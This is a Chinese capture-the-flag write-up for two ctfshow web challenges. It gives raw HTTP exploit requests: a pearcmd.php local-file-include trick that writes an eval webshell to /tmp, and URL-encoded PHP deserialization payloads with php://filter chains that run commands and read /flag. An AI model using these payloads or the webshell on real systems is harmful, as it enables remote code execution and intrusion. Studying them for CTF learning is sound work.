## CTFSHOW元旦水友赛

## easy_include

```php
<?php

function waf($path){
    $path = str_replace(".","",$path);
    return preg_match("/^[a-z]+/",$path);
}

if(waf($_POST[1])){
    include "file://".$_POST[1];
}
```

只能是小写字母开头，用localhost开头就行了

这题是利用pearcmd

```http
POST /?+config-create+/<?=eval($_POST[a]);?>+/tmp/1.php HTTP/1.1
Host: 9d99fbea-9fde-4f64-a7dd-483220686300.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://9d99fbea-9fde-4f64-a7dd-483220686300.challenge.ctf.show
Connection: close
Referer: http://9d99fbea-9fde-4f64-a7dd-483220686300.challenge.ctf.show/
Cookie: PHPSESSID=c434ca72b822edd7301e5c0e15d859ac
Upgrade-Insecure-Requests: 1

1=localhost/usr/local/lib/php/pearcmd.php
```

然后再包含1.php就可以了

## easy_web

```php
开胃小菜，就让我成为签到题叭 <?php
header('Content-Type:text/html;charset=utf-8');
error_reporting(0);

function waf1($Chu0){
    foreach ($Chu0 as $name => $value) {
        if(preg_match('/[a-z]/i', $value)){
            exit("waf1");
        }
    }
}

function waf2($Chu0){
    if(preg_match('/show/i', $Chu0))
        exit("waf2");
}

function waf_in_waf_php($a){
    $count = substr_count($a,'base64');
    echo "hinthinthint,base64喔"."<br>";
    if($count!=1){
        return True;
    }
    if (preg_match('/ucs-2|phar|data|input|zip|flag|\%/i',$a)){
        return True;
    }else{
        return false;
    }
}

class ctf{
    public $h1;
    public $h2;
    public function __wakeup(){
        throw new Exception("fastfast");
    }
    public function __destruct()
    {
        $this->h1->nonono($this->h2);
    }
}

class show{

    public function __call($name,$args){
        if(preg_match('/ctf/i',$args[0][0][2])){
            echo "gogogo";
        }
    }
}

class Chu0_write{
    public $chu0;
    public $chu1;
    public $cmd;
    public function __construct(){
        $this->chu0 = 'xiuxiuxiu';
    }
    public function __toString(){
        echo "__toString"."<br>";
        if ($this->chu0===$this->chu1){
            $content='ctfshowshowshowwww'.$_GET['chu0'];
            if (!waf_in_waf_php($_GET['name'])){
                file_put_contents($_GET['name'].".txt",$content);
            }else{
                echo "绕一下吧孩子";
            }
                $tmp = file_get_contents('ctfw.txt');
                echo $tmp."<br>";
                if (!preg_match("/f|l|a|g|x|\*|\?|\[|\]| |\'|\<|\>|\%/i",$_GET['cmd'])){
                    eval($tmp($_GET['cmd']));
                }else{
                    echo "waf!";
                }

            file_put_contents("ctfw.txt","");
        }
        return "Go on";
        }
}
if (!$_GET['show_show.show']){
    echo "开胃小菜，就让我成为签到题叭";
    highlight_file(__FILE__);
}else{
    echo "WAF,启动！";
    waf1($_REQUEST);
    waf2($_SERVER['QUERY_STRING']);
    if (!preg_match('/^[Oa]:[\d]/i',$_GET['show_show.show'])){
        unserialize($_GET['show_show.show']);
    }else{
        echo "被waf啦";
    }
}
```

姿势一：

```http
POST /?%73%68%6f%77%5b%73%68%6f%77%2e%73%68%6f%77=%43%3a%31%31%3a%22%41%72%72%61%79%4f%62%6a%65%63%74%22%3a%31%37%38%3a%7b%78%3a%69%3a%30%3b%61%3a%30%3a%7b%7d%3b%6d%3a%61%3a%31%3a%7b%73%3a%31%3a%22%62%22%3b%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%33%3a%7b%69%3a%30%3b%73%3a%30%3a%22%22%3b%69%3a%31%3b%73%3a%30%3a%22%22%3b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%4e%3b%73%3a%34%3a%22%63%68%75%31%22%3b%4e%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d%7d&chu0=c=003=00l=00z=00d=00G=00V=00t=00&name=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw&cmd=env HTTP/1.1
Host: 6a8066ea-fb86-4f70-84c7-fc5cb98cb654.challenge.ctf.show
Content-Length: 38
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Origin: http://6a8066ea-fb86-4f70-84c7-fc5cb98cb654.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://6a8066ea-fb86-4f70-84c7-fc5cb98cb654.challenge.ctf.show/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

show%5Bshow.show=1&chu0=1&name=1&cmd=1
```

姿势二：

```http
POST /?%73%68%6f%77%5b%73%68%6f%77%2e%73%68%6f%77=%43%3a%31%31%3a%22%41%72%72%61%79%4f%62%6a%65%63%74%22%3a%31%37%38%3a%7b%78%3a%69%3a%30%3b%61%3a%30%3a%7b%7d%3b%6d%3a%61%3a%31%3a%7b%73%3a%31%3a%22%62%22%3b%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%33%3a%7b%69%3a%30%3b%73%3a%30%3a%22%22%3b%69%3a%31%3b%73%3a%30%3a%22%22%3b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%4e%3b%73%3a%34%3a%22%63%68%75%31%22%3b%4e%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d%7d&chu0=Y=00X=00N=00z=00Z=00X=00J=000=00&name=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw&cmd=%73%68%6F%77_source(chr(47).chr(102).chr(108).chr(97).chr(103)); HTTP/1.1
Host: 6052d5a2-7e3b-4575-ae83-23647302e0e3.challenge.ctf.show
Content-Length: 38
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Origin: http://6052d5a2-7e3b-4575-ae83-23647302e0e3.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://6052d5a2-7e3b-4575-ae83-23647302e0e3.challenge.ctf.show
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

show%5Bshow.show=1&chu0=1&name=1&cmd=1
```

